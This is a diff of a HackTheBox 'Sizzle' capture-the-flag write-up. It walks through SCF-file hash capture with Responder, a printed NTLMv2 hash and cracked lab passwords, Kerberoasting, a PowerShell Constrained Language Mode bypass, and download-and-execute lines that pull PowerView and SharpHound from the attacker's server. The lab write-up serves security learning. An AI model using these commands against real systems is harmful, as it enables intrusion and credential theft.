@@ -11,7 +11,7 @@ This is my write-up for the HackTheBox Machine named Sizzle. I have to give a la
 Let's get straight into it!
 
 A TCP scan on all ports reveals the following ports as open:
-21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001
+`21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001`
 
 So let's do a version scan on all these ports:
 ```c {hl_lines=[1]}
@@ -65,22 +65,22 @@ So we have a few non-standard shares available to us, including "CertEnroll", "O
 
 Let's enumerate HTTP(S) next:
 ```c {hl_lines=[1]}
-$ gobuster -u http://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+$ gobuster -u "http://10.10.10.103" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /images (Status: 301)
 /Images (Status: 301)
 /IMAGES (Status: 301)
 ```
 
 ```c {hl_lines=[1]}
-$ gobuster -u https://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+$ gobuster -u "https://10.10.10.103" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 /images (Status: 301)
 /Images (Status: 301)
 /IMAGES (Status: 301)
 ```
 
-Hmmm nothing useful here. Visiting the home page of http://10.10.10.103 simply shows a GIF of some meat sizzling on a hot surface.
+Hmmm nothing useful here. Visiting the home page of `http://10.10.10.103` simply shows a GIF of some meat sizzling on a hot surface.
 
-Finally, for enumeration, let's enumerate the FTP server:
+Finally, to finalize the enumeration step, let's enumerate the FTP server:
 ```c {hl_lines=[1,9,13]}
 $ ftp 10.10.10.103
 Connected to 10.10.10.103.
@@ -100,9 +100,9 @@ local: test.txt remote: test.txt
 550 Access is denied.
 ```
 
-We find no files publicly available on the FTP server, and get an Access Denied error when trying to upload files.
+We find no files publicly available on the FTP server, and get an `Access Denied` error when trying to upload files.
 
-Unfortunately, this is where I was stuck for a while. I enumerated the different SMB shares and the files and folders inside but found nothing that stood out for initial compromise. The following folders were found in the "Department Shares" share:
+Unfortunately, this is where I was stuck for a while. I enumerated the different SMB shares and the files and folders inside but found nothing that stood out for initial compromise. The following folders were found in the `Department Shares` share:
 
 ```c {hl_lines=[1,3]}
 $ smbclient \\\\10.10.10.103\\Department\ Shares -U anonymous -N
@@ -157,7 +157,7 @@ smb: \Users\> ls
 
 ```
 
-So we now have a bunch of usernames we can use for future steps i.e. amanda, amanda_adm, bill, bob, chris, henry, joe, jose, lkys37en, morgan and mrb3n. We additionally have a Public folder in the Users folder. Thinking about what user the FTP server is running as, it may be possible that we have write privileges to a Public folder. It is likely that the FTP server is running with least level privileges, but that any user is able to write to a Public folder. We try to place a test.txt file to test this hypothesis:
+So we now have a bunch of usernames we can use for future steps i.e. `amanda`, `amanda_adm`, `bill`, `bob`, `chris`, `henry`, `joe`, `jose`, `lkys37en`, `morgan` and `mrb3n`. We additionally have a `Public` folder in the `Users` folder. Thinking about what user the FTP server is running as, it may be possible that we have write privileges to a `Public` folder. It is likely that the FTP server is running with least level privileges, but that any user is able to write to a `Public` folder. We try to place a `test.txt` file to test this hypothesis:
 
 ```c {hl_lines=[1,3]}
 smb: \Users\Public\> put test.txt 
@@ -174,7 +174,7 @@ https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
 
 The SCF attack involves using placing a specially crafted SCF file on the shared drive. Then the attack requires that a user on the machine open the folder. From the website above: ```"When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file."``` If this is the actual intended vulnerability for initial compromise, then there must be a script running on Sizzle that opens the Public folder. Let's try out the attack and see!
 
-First, we create a SCF file as follows, where 10.10.15.30 is my tun0 IP address:
+First, we create a SCF file as follows, where `10.10.15.30` is my `tun0` IP address:
 ```c {hl_lines=[1]}
 $ cat @mytest.scf 
 [Shell]
@@ -185,7 +185,7 @@ Command=ToggleDesktop
 
 ```
 
-Note that the SCF filename starts with the @ character so that it comes up as the first file when viewed in a directory browser. We then start [responder](https://github.com/SpiderLabs/Responder) on our attacker machine:
+Note that the SCF filename starts with the `@` character so that it comes up as the first file when viewed in a directory browser. We then start [responder](https://github.com/SpiderLabs/Responder) on our attacker machine to listen for any connections (and credentials):
 ```c {hl_lines=[1]}
 $ responder -I tun0
                                          __
@@ -223,7 +223,7 @@ $ responder -I tun0
 
 ```
 
-Great! We now have HTB\amanda's hash! Let's try crack it! We'll just use the common rockyou.txt wordlist:
+Great! We now have `HTB\amanda`'s hash! Let's try crack it! We'll just use the common rockyou.txt wordlist:
 ```c {hl_lines=[1,3]}
 $ cat hash
 amanda::HTB:a54c47483fcc6a20:CE16D8EC24B20C8B9D347AAC24EA327D:0101000000000000C0653150DE09D20122CDF94B8B490287000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000E2474A4FC02AD635EC39F0E6F8D60B331F2A24C61353E30C14190A558728F30C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003100000000000000000000000000
@@ -258,22 +258,23 @@ Password:
 
 ```
 
-Looking through all the open ports again, we could possibly try amanda's credentials on the FTP server, or look at the other windows services such as LDAP on port 3268 or WinRM on port 5968.
+Looking through all the open ports again, we could possibly try `amanda`'s credentials on the FTP server, or look at the other windows services such as LDAP on port 3268 or WinRM on port 5968.
 
 I'll save the trouble and skip to what actually worked. It took a lot of researching, but I eventually found some very interesting ways to authenticate and interact with WinRM from a linux machine:
-https://blog.rapid7.com/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/
-https://4sysops.com/archives/powershell-remoting-between-windows-and-linux/
-https://github.com/masterzen/winrm-cli
+ - https://blog.rapid7.com/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/
+ - https://4sysops.com/archives/powershell-remoting-between-windows-and-linux/
+ - https://github.com/masterzen/winrm-cli
 
-But I faced problems with all of these! For example powershell on linux and winrm-cli both seemed to only support basic auth, not NTLM auth:
+But I faced problems with all of these! For example `powershell on linux` and `winrm-cli` both seemed to only support basic auth, not NTLM auth:
 https://www.reddit.com/r/PowerShell/comments/6q2vs9/how_to_connect_to_winrm_powershell_from_linux/
+
 There may be a way to use powershell on linux with NTLM auth, but it looks painful:
 https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dkahvnf/
 
 I then also realised that the nmap results for port 5968 mentioned that the service was using SSL. So my WinRM client would also have to support SSL.
 
 Googling for "winrm https client linux", I find the following link: https://krash.be/node/29
-Here, the writer recommends using a [Ruby Gem called winrm](https://github.com/WinRb/WinRM) for connecting to WinRM from Linux to Windows. This page has great documentation on writing a client as well, so we set one up using the credentials we have:
+Here, the writer recommends using a [Ruby Gem called winrm](https://github.com/WinRb/WinRM) for connecting to WinRM from Linux to Windows. This page has great documentation on writing a client as well, so we set one up using the credentials we have as follows:
 
 ```ruby {hl_lines=[1]}
 $ cat https-amanda-winrm.rb 
@@ -305,12 +306,13 @@ Googling this error, we find that the cause is "when a self-signed certificate c
 
 Additionally, doing a little more research on WinRM with SSL leads us to the following article from Microsoft:
 https://support.microsoft.com/en-au/help/2019527/how-to-configure-winrm-for-https
+
 What's important to us is the following line:
 "If you have a Microsoft Certificate server you may be able to request a certificate using the web certificate template from `HTTPS://<MyDomainCertificateServer>/certsrv"`
 
-So to summarise, we may need a self signed certificate, and a Microsoft certificate server can be used to request a certificate.
+So to summarise, **we may need a signed certificate to authenticate, and a Microsoft certificate server can be used to request a certificate**.
 
-When we try visiting `http://10.10.10.103/certsrv` we actually find that we are provided with a popup asking for credentials. We enter amanda's credentials and are presented with a web page we haven't seen before. It looks like we can use this page to request a certificate! It's odd that we didn't pick up this site before though. (Turned out that certsrv is not in the `directory-list-2.3-medium.txt` wordlist, but is in dirb's `common.txt` wordlist - I've put this in my "General approach" cheatsheet for the future!)
+When we try visiting `http://10.10.10.103/certsrv` we actually find that we are provided with a popup asking for credentials. We enter amanda's credentials and are presented with a web page we haven't seen before. It looks like we can use this page to request a certificate! It's odd that we didn't pick up this site before though. (Turned out that `certsrv` is not in the `directory-list-2.3-medium.txt` wordlist, but is in dirb's `common.txt` wordlist - I've put this in my "General approach" cheatsheet for the future!)
 
 When we go to "Request a Certificate" and then to "Advanced certificate request" we see that we can submit a Certificate Signing Request (CSR) to have our private key signed by the server. The advanced certificate request page is at: `http://10.10.10.103/certsrv/certrqxt.asp`
 
@@ -319,7 +321,7 @@ We can create our own private key with a CSR using the following command:
 $ openssl req -new -newkey rsa:2048 -nodes -out dev.csr -keyout dev.key
 ```
 
-The above command outputs a private key (`dev.key`) and a CSR (`dev.csr`). We can submit the contents of the CSR (including the header and footer) to the Advanced Certificate Request page, and the server will create a certificate for us with a signature approving our private key. We retrieve `certnew.cer` from the server and now should be able to use this for authentication to WinRM. Note that because we logged in to the certsrv portal with amanda's credentials, the private key should now be linked with amanda's account.
+The above command outputs a private key (`dev.key`) and a CSR (`dev.csr`). We can submit the contents of the CSR (including the header and footer) to the `Advanced Certificate Request` page, and the server will create a certificate for us with a signature approving our private key. We retrieve `certnew.cer` from the server and now should be able to use this for authentication to WinRM. Note that because we logged in to the certsrv portal with amanda's credentials, the private key should now be linked with amanda's account.
 
 Referencing code from the Ruby gem's page again, we set up the following code for authenticating to WinRM using a private key and certificate:
 ```ruby {hl_lines=[1]}
@@ -359,7 +361,7 @@ htb\amanda
 
 ---
 
-OK although we did all that work to get our first shell, unfortunately we still don't have user.txt! Looking around in Amanda's desktop, Documents folder, and Downloads folder, we find nothing of interest.
+OK although we did all that work to get our first shell, unfortunately we still don't have `user.txt`! Looking around in Amanda's desktop, Documents folder, and Downloads folder, we find nothing of interest.
 
 Let's do some enumeration, starting with ```systeminfo``` and looking at the list of other users on the system:
 
@@ -383,9 +385,9 @@ The command completed with one or more errors.
 
 Interestingly, we aren't allowed to run `systeminfo`! However, there is a user called `sizzler`, and another one called `krbtgt` which straight away stick out. The `sizzler` account is similar to the name of the machine, and the `krbtgt` user means that Kerberos authentication is most likely enabled. From our perspective, it means Kerberoasting may be an option to laterally compromise another user.
 
-I would recommend [Tim Medin's talk on Kerberoasting](https://www.youtube.com/watch?v=PUyhlN-E5MU) as it explains exactly how it works. His [slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) are also available online. To put it simply, Kerberoasting involves requesting kerberos tickets for services. Part of these tickets may be encrypted with the RC4 algorithm where the private key is the "Kerberos TGS-REP etype 23 hash of the service account associated with the SPN". More details can be found on the MITRE ATT&CK page [here](https://attack.mitre.org/techniques/T1208/). If there is an account associated with an SPN, and has a weak password, we may be able to crack its hash and get back the password.
+I would recommend [Tim Medin's talk on Kerberoasting](https://www.youtube.com/watch?v=PUyhlN-E5MU) as it explains exactly how it works. His [slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) are also available online. To put it simply, Kerberoasting involves requesting kerberos tickets for services. Part of these tickets may be encrypted with the RC4 algorithm where the private key is the "Kerberos TGS-REP etype 23 hash of the service account associated with the SPN". More details can be found on the MITRE ATT&CK page [here](https://attack.mitre.org/techniques/T1208/). If there is an account associated with an SPN, and has a weak password, we may be able to crack its hash and get back the password for that service account.
 
-To start with, we can try to import PowerView into powershell to allow us to use the `Invoke-Kerberoast` function. PowerView started [supporting Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) a few years ago. So let's try downloading the `PowerView.PS1` script onto the box with powershell and then importing it. We can use ```# python -m SimpleHTTPServer 8081``` to start a web server to serve our scripts, and we can get PowerView.PS1 from the [PowerSploit github repo](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). Note that the main branch version doesn't have `Invoke-Kerberoast` as yet, but the one I linked does. Our result is as follows:
+To start with, we can try to import `PowerView` into powershell to allow us to use the `Invoke-Kerberoast` function. PowerView started [supporting Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) a few years ago. So let's try downloading the `PowerView.PS1` script onto the box with powershell and then importing it. We can use ```$ python -m SimpleHTTPServer 8081``` to start a web server to serve our scripts, and we can get `PowerView.PS1` from the [PowerSploit github repo](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). Note that the main branch version doesn't have `Invoke-Kerberoast` as yet, but the one I linked does. Our result is as follows:
 
 ```c {hl_lines=[1,2,3]}
 $ ruby shell-winrm.rb 
@@ -399,7 +401,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
 ```
 
-Unfortunately, we get a permission denied error when trying to import PowerView. The error is caused by a feature of PowerShell called "Constrained Language Mode", where not all powershell features are allowed to be performed.
+Unfortunately, we get a `permission denied` error when trying to import `PowerView`. The error is caused by a feature of PowerShell called "Constrained Language Mode", where not all powershell features are allowed to be performed.
 
 I know there is also a way to directly download and import the PS1 script into memory without needing to store the PS1 file on disk, so we can try that too:
 
@@ -413,7 +415,7 @@ At line:1 char:6
     + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
 ```
 
-That didn't work either! Looks like we will have to bypass powershell constrained mode first before moving forward.
+That didn't work either! Looks like we will have to **bypass powershell constrained mode** first before moving forward.
 
 Researching a bit on bypassing powershell constrained mode, we find two common ways to bypass it:
 * Use `powershell -v2` to spawn a new process with a [downgraded version of powershell](https://ired.team/offensive-security/powershell-constrained-language-mode-bypass) which doesnt support constrained mode
@@ -446,7 +448,7 @@ As we can see above, we now have a shell with `FullLanguage` mode enabled! Now w
 PS C:\Users\amanda\Documents> iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/PowerView.ps1')
 ```
 
-To use Invoke-Kerberoast, it's important that our current shell has amanda's kerberos token in memory so that it can be used to request tickets from the domain controller. We run the following commands to perform the kerberoast attack:
+To use `Invoke-Kerberoast`, it's important that our current shell has amanda's kerberos token in memory so that it can be used to request tickets from the domain controller. We run the following commands to perform the kerberoast attack:
 
 ```c
 PS C:\Users\amanda\Documents> $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
@@ -455,7 +457,7 @@ PS C:\Users\amanda\Documents> Invoke-UserImpersonation -Credential $Cred
 PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
 
-Again it should be noted that we need a special version of PowerView which includes Invoke-UserImpersonation and Invoke-Kerberoast as found [here](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). An example of using Invoke-UserImpersonation can be found on line [2065](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1#L2065). The output of Invoke-Kerberoast returns us a kerberos ticket signed with mrlky's hash:
+Again it should be noted that we need a special version of PowerView which includes `Invoke-UserImpersonation` and `Invoke-Kerberoast` as found [here](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). An example of using `Invoke-UserImpersonation` can be found on line [2065](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1#L2065). The output of `Invoke-Kerberoast` returns us a kerberos ticket signed with `mrlky`'s hash:
 
 ```c {hl_lines=[1]}
 PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl
@@ -483,6 +485,7 @@ $krb5tgs$23$*user$realm$test/spn*$506fb86544c2ee265dc9aa32129d4294$9472892cfad15
 ```
 
 We now have the following creds!  ```mrlky:Football#7```
+
 We can perform the same steps as we did for amanda to get a shell as mrlky:
 1. create a private key and CSR using openssl
 2. login to the `/certsrv` portal and login using `mrlky`'s credentials
@@ -541,7 +544,6 @@ So, let's now move on to privesc!
 
 There are a couple of scripts we can try to look for Windows privilege escalation vectors e.g. PowerUp, BloodHound / SharpHound, or [JAWS](https://github.com/411Hall/JAWS). PowerUp is for a local machine, while BloodHound is useful for privilege escalating in a domain environment. JAWS is a Windows enumeration script. As PowerUp didn't find anything useful for me, I'll skip to how I got BloodHound working:
 
-
 BloodHound requires us to first gather information from the compromised host. A tool called SharpHound includes scripts for gathering this information and can be found [here](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors).
 
 We use our `FullLanguage` mode shell to import this ingestor in memory and run it:
@@ -563,7 +565,7 @@ powershell.exe : Invoke : Exception calling "Invoke" with "2" argument(s): "Atte
 
 ```
 
-As this isn't working, I started looking for other versions of SharpHound and stumbled across [this one](https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/credentials/Bunnyhound/SharpHound.ps1) hosted in hak5's github repo. This script worked using powershell -v2 for bypassing constrained mode:
+As this isn't working, I started looking for other versions of SharpHound and stumbled across [this one](https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/credentials/Bunnyhound/SharpHound.ps1) hosted in hak5's github repo. This script worked using `powershell -v2` for bypassing constrained mode:
 
 ```c {hl_lines=[1]}
 PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/bashbunny-payloads/payloads/library/credentials/Bunnyhound/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
